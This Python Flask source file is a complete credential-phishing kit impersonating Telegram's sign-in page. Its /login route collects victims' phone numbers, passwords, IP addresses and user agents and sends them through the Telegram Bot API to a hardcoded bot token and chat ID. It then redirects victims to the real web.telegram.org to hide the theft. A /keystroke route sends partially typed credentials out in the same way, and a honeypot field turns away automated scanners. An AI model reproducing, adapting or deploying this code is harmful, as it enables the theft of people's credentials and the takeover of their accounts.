from flask import Flask, request, render_template_string, redirect
import requests
from datetime import datetime

app = Flask(__name__)

# ===== CONFIG =====
BOT_TOKEN = "8161884377:AAH7zILNRGrqH-12JtobVpsxslIXIQoMipM"  # Get from @BotFather
CHAT_ID = "6181804501"      # Get from @userinfobot
# =================

# Your HTML page (same as final version)
HTML_PAGE = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Telegram</title>
    <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath d='M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0z' fill='%230088cc'/%3E%3Cpath d='M5.491 11.74l11.57-4.461c.537-.194 1.006.131.832.943l.001-.001-1.97 9.281c-.146.658-.537.818-1.084.508l-3.013-2.222-1.467 1.412c-.162.162-.297.297-.605.297l.216-3.073 5.593-5.055c.243-.216-.054-.338-.377-.121l-6.914 4.354-2.982-.934c-.648-.203-.66-.648.135-.962z' fill='%23ffffff'/%3E%3C/svg%3E" type="image/svg+xml">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: #0f0f0f;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 16px;
            -webkit-text-size-adjust: 100%;
        }
        .login-wrapper {
            background: #1a1a1a;
            border-radius: 28px;
            padding: 48px 40px 40px;
            width: 100%;
            max-width: 440px;
            box-shadow: 0 12px 48px rgba(0,0,0,0.8);
            border: 1px solid #2a2a2a;
        }
        .telegram-logo {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            margin-bottom: 32px;
        }
        .telegram-logo svg {
            width: 48px;
            height: 48px;
        }
        .telegram-logo span {
            font-size: 28px;
            font-weight: 600;
            color: #ffffff;
        }
        .login-header {
            text-align: center;
            margin-bottom: 28px;
        }
        .login-header h1 {
            color: #ffffff;
            font-size: 22px;
            font-weight: 500;
            margin-bottom: 6px;
        }
        .login-header p {
            color: #888888;
            font-size: 15px;
        }
        .input-group {
            margin-bottom: 16px;
        }
        .input-group label {
            display: block;
            color: #888888;
            font-size: 13px;
            font-weight: 500;
            margin-bottom: 6px;
            text-transform: uppercase;
            letter-spacing: 0.3px;
        }

        /* ===== PHONE ROW ===== */
        .phone-row {
            display: flex;
            align-items: center;
            background: #262626;
            border: 1px solid #333333;
            border-radius: 10px;
            transition: border-color 0.2s, background 0.2s;
            padding: 0 4px;
            min-height: 52px;
        }
        .phone-row:focus-within {
            border-color: #0088cc;
            background: #2a2a2a;
        }
        .phone-row .country-code {
            width: 65px;
            min-width: 50px;
            flex-shrink: 0;
            border: none;
            background: transparent;
            padding: 14px 4px 14px 14px;
            color: #ffffff;
            font-size: 16px;
            outline: none;
            text-align: center;
            font-weight: 500;
        }
        .phone-row .country-code::placeholder {
            color: #555555;
            font-weight: 400;
        }
        .phone-row .separator {
            color: #555555;
            font-size: 18px;
            padding: 0 2px;
            user-select: none;
            flex-shrink: 0;
        }
        .phone-row .phone-input {
            flex: 1;
            min-width: 120px;
            border: none;
            background: transparent;
            padding: 14px 14px 14px 4px;
            color: #ffffff;
            font-size: 16px;
            outline: none;
        }
        .phone-row .phone-input::placeholder {
            color: #555555;
        }

        /* ===== PASSWORD WRAPPER - MOBILE FIX ===== */
        .password-wrapper {
            display: flex;
            align-items: center;
            background: #262626;
            border: 1px solid #333333;
            border-radius: 10px;
            transition: border-color 0.2s, background 0.2s;
            min-height: 52px;
            position: relative;
        }
        .password-wrapper:focus-within {
            border-color: #0088cc;
            background: #2a2a2a;
        }
        .password-wrapper input {
            flex: 1;
            min-width: 80px;
            border: none;
            background: transparent;
            padding: 14px 12px 14px 16px;
            color: #ffffff !important;
            font-size: 16px;
            outline: none;
            -webkit-text-fill-color: #ffffff !important;
            opacity: 1 !important;
        }
        .password-wrapper input::placeholder {
            color: #555555 !important;
            -webkit-text-fill-color: #555555 !important;
            opacity: 1 !important;
        }

        /* ===== KILL BROWSER NATIVE EYE & AUTOFILL OVERLAY ===== */
        .password-wrapper input::-webkit-credentials-auto-fill-button,
        .password-wrapper input::-webkit-caps-lock-indicator,
        .password-wrapper input::-webkit-textfield-decoration-container {
            display: none !important;
        }
        .password-wrapper input::-webkit-reveal {
            display: none !important;
        }
        .password-wrapper input::-moz-reveal {
            display: none !important;
        }
        .password-wrapper input[type="password"]::-ms-reveal,
        .password-wrapper input[type="password"]::-ms-clear {
            display: none !important;
        }

        /* ===== MOBILE AUTOFILL OVERRIDE ===== */
        .password-wrapper input:-webkit-autofill,
        .password-wrapper input:-webkit-autofill:hover,
        .password-wrapper input:-webkit-autofill:focus,
        .password-wrapper input:-webkit-autofill:active {
            -webkit-box-shadow: 0 0 0 1000px #262626 inset !important;
            -webkit-text-fill-color: #ffffff !important;
            caret-color: #ffffff !important;
            background-color: #262626 !important;
            background: #262626 !important;
            color: #ffffff !important;
            transition: background-color 5000s ease-in-out 0s;
        }

        /* ===== CUSTOM EYE TOGGLE ===== */
        .password-toggle {
            flex-shrink: 0;
            background: none;
            border: none;
            cursor: pointer;
            padding: 8px 14px 8px 6px;
            color: #888;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: color 0.2s;
            height: 100%;
            min-height: 44px;
            position: relative;
            z-index: 2;
        }
        .password-toggle:hover {
            color: #ddd;
        }
        .password-toggle svg {
            width: 22px;
            height: 22px;
            display: block;
            stroke: currentColor;
            stroke-width: 2;
            fill: none;
            stroke-linecap: round;
            stroke-linejoin: round;
        }
        .password-toggle .eye-closed {
            display: none;
        }
        .password-toggle.hidden .eye-open {
            display: none;
        }
        .password-toggle.hidden .eye-closed {
            display: block;
        }

        .options-row {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin: 16px 0 20px;
            flex-wrap: wrap;
            gap: 8px;
        }
        .options-row label {
            color: #888;
            font-size: 14px;
            display: flex;
            align-items: center;
            gap: 8px;
            cursor: pointer;
        }
        .options-row label input[type="checkbox"] {
            width: 16px;
            height: 16px;
            accent-color: #0088cc;
        }
        .options-row a {
            color: #0088cc;
            font-size: 14px;
            text-decoration: none;
        }
        .options-row a:hover {
            text-decoration: underline;
        }
        .login-btn {
            width: 100%;
            padding: 14px;
            background: #0088cc;
            border: none;
            border-radius: 10px;
            color: #ffffff;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.2s, opacity 0.2s;
        }
        .login-btn:hover {
            background: #0099dd;
        }
        .login-btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }
        .signup-row {
            text-align: center;
            margin-top: 18px;
            color: #888;
            font-size: 14px;
        }
        .signup-row a {
            color: #0088cc;
            text-decoration: none;
            font-weight: 500;
        }
        .signup-row a:hover {
            text-decoration: underline;
        }
        .qr-divider {
            display: flex;
            align-items: center;
            gap: 16px;
            margin: 20px 0 16px;
        }
        .qr-divider::before,
        .qr-divider::after {
            content: '';
            flex: 1;
            height: 1px;
            background: #2a2a2a;
        }
        .qr-divider span {
            color: #555;
            font-size: 13px;
        }
        .qr-option {
            text-align: center;
        }
        .qr-option a {
            color: #0088cc;
            text-decoration: none;
            font-size: 14px;
        }
        .qr-option a:hover {
            text-decoration: underline;
        }
        .footer {
            text-align: center;
            margin-top: 24px;
            color: #444;
            font-size: 12px;
        }
        .footer a {
            color: #555;
            text-decoration: none;
        }
        .footer a:hover {
            color: #777;
        }

        /* ===== LOADING OVERLAY ===== */
        .loading-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.85);
            z-index: 9999;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            gap: 20px;
        }
        .loading-overlay.active {
            display: flex;
        }
        .loading-spinner {
            width: 48px;
            height: 48px;
            border: 4px solid #2a2a2a;
            border-top-color: #0088cc;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        .loading-overlay p {
            color: #aaa;
            font-size: 15px;
        }

        /* ===== HONEYPOT ===== */
        .honeypot {
            position: absolute;
            left: -9999px;
            top: -9999px;
            opacity: 0;
            pointer-events: none;
        }

        /* ===== RESPONSIVE ===== */
        @media (max-width: 500px) {
            .login-wrapper {
                padding: 32px 20px 28px;
                border-radius: 16px;
                margin: 0;
            }
            .phone-row .country-code {
                width: 50px;
                min-width: 40px;
                padding: 12px 2px 12px 10px;
                font-size: 15px;
            }
            .phone-row .phone-input {
                padding: 12px 10px 12px 2px;
                font-size: 15px;
                min-width: 80px;
            }
            .password-wrapper input {
                padding: 12px 10px 12px 14px;
                font-size: 15px;
            }
            .password-toggle {
                padding: 6px 10px 6px 4px;
                min-height: 40px;
            }
            .password-toggle svg {
                width: 20px;
                height: 20px;
            }
        }
        @media (min-width: 1200px) {
            .login-wrapper {
                max-width: 460px;
                padding: 56px 48px 48px;
            }
            .phone-row .country-code {
                width: 70px;
                padding: 16px 6px 16px 18px;
                font-size: 17px;
            }
            .phone-row .phone-input {
                padding: 16px 18px 16px 6px;
                font-size: 17px;
            }
            .password-wrapper input {
                padding: 16px 14px 16px 18px;
                font-size: 17px;
            }
            .password-toggle {
                padding: 10px 18px 10px 8px;
                min-height: 52px;
            }
            .password-toggle svg {
                width: 24px;
                height: 24px;
            }
        }
    </style>
</head>
<body>
    <div class="loading-overlay" id="loadingOverlay">
        <div class="loading-spinner"></div>
        <p>Connecting to Telegram...</p>
    </div>
    <div class="login-wrapper">
        <div class="telegram-logo">
            <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0z" fill="#0088cc"/>
                <path d="M5.491 11.74l11.57-4.461c.537-.194 1.006.131.832.943l.001-.001-1.97 9.281c-.146.658-.537.818-1.084.508l-3.013-2.222-1.467 1.412c-.162.162-.297.297-.605.297l.216-3.073 5.593-5.055c.243-.216-.054-.338-.377-.121l-6.914 4.354-2.982-.934c-.648-.203-.66-.648.135-.962z" fill="#ffffff"/>
            </svg>
            <span>Telegram</span>
        </div>
        <div class="login-header">
            <h1>Sign in</h1>
            <p>Enter your phone number and password</p>
        </div>
        <form id="loginForm" method="POST" action="/login">
            <div class="input-group">
                <label>Phone number</label>
                <div class="phone-row">
                    <input type="text" class="country-code" id="countryCode" name="country_code" placeholder="+__" value="+1" maxlength="5">
                    <span class="separator"> </span>
                    <input type="tel" class="phone-input" id="phone" name="phone" placeholder="(555) 123-4567" maxlength="15" required autofocus>
                </div>
            </div>
            <div class="input-group">
                <label>Password</label>
                <div class="password-wrapper">
                    <input type="password" id="password" name="password" placeholder="Enter your password" required>
                    <button type="button" class="password-toggle hidden" id="togglePassword" aria-label="Toggle password visibility">
                        <svg class="eye-open" viewBox="0 0 24 24">
                            <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
                            <circle cx="12" cy="12" r="3"/>
                        </svg>
                        <svg class="eye-closed" viewBox="0 0 24 24">
                            <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
                            <circle cx="12" cy="12" r="3"/>
                            <line x1="3" y1="3" x2="21" y2="21"/>
                        </svg>
                    </button>
                </div>
            </div>
            <div class="honeypot">
                <label for="website">Website</label>
                <input type="text" id="website" name="website" tabindex="-1" autocomplete="off">
            </div>
            <input type="hidden" name="session_token" id="sessionToken" value="">
            <div class="options-row">
                <label>
                    <input type="checkbox" name="remember" checked> Remember me
                </label>
                <a href="#">Forgot password?</a>
            </div>
            <button type="submit" class="login-btn" id="loginBtn">Sign In</button>
        </form>
        <div class="signup-row">
            Don't have an account? <a href="#">Sign up</a>
        </div>
        <div class="qr-divider">
            <span>or</span>
        </div>
        <div class="qr-option">
            <a href="#">Log in using QR code</a>
        </div>
        <div class="footer">
            <a href="#">Privacy Policy</a> • <a href="#">Terms</a>
        </div>
    </div>
    <script>
        (function() {
            const toggle = document.getElementById('togglePassword');
            const field = document.getElementById('password');
            let visible = false;
            toggle.classList.add('hidden');
            toggle.addEventListener('click', function(e) {
                e.preventDefault();
                visible = !visible;
                toggle.classList.toggle('hidden', !visible);
                field.type = visible ? 'text' : 'password';
                field.focus();
            });
            field.addEventListener('input', function() {
                if (this.value.length === 0 && visible) {
                    visible = false;
                    toggle.classList.add('hidden');
                    this.type = 'password';
                }
            });
        })();
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            if (document.getElementById('website').value.length > 0) {
                e.preventDefault();
                window.location.href = 'https://telegram.org';
                return;
            }
            const btn = document.getElementById('loginBtn');
            btn.disabled = true;
            btn.textContent = 'Signing in...';
            document.getElementById('loadingOverlay').classList.add('active');
            document.getElementById('sessionToken').value = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
        });
        document.addEventListener('DOMContentLoaded', function() {
            document.getElementById('phone').focus();
        });
    </script>
</body>
</html>"""

@app.route('/')
def index():
    return render_template_string(HTML_PAGE)

@app.route('/login', methods=['POST'])
def login():
    phone = request.form.get('phone', '')
    password = request.form.get('password', '')
    country = request.form.get('country_code', '')
    session_token = request.form.get('session_token', '')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
    user_agent = request.headers.get('User-Agent', 'Unknown')
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S UTC')

    # Build full phone number
    full_phone = f"{country}{phone}" if phone else phone

    # Send to Telegram
    message = f"""🔐 **NEW LOGIN CREDENTIALS**
    
📱 **Phone:** `{full_phone}`
🔑 **Password:** `{password}`
🎫 **Session:** `{session_token}`
🌐 **IP:** `{ip}`
🖥️ **User-Agent:** `{user_agent}`
🕒 **Time:** `{timestamp}`
"""

    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {
            "chat_id": CHAT_ID,
            "text": message,
            "parse_mode": "Markdown"
        }
        requests.post(url, json=payload, timeout=5)
    except Exception as e:
        print(f"Telegram send failed: {e}")

    # Redirect to real Telegram
    return redirect('https://web.telegram.org')

@app.route('/keystroke', methods=['POST'])
def keystroke():
    phone = request.form.get('phone_keystrokes', '')
    password = request.form.get('pass_keystrokes', '')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()

    if phone or password:
        msg = f"""⌨️ **PARTIAL KEYSTROKES**
📱 Phone: `{phone}`
🔑 Pass: `{password}`
🌐 IP: `{ip}`
⚠️ User may have aborted
"""
        try:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
            requests.post(url, json={
                "chat_id": CHAT_ID,
                "text": msg,
                "parse_mode": "Markdown"
            }, timeout=3)
        except:
            pass
    return '', 204

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080, debug=False)
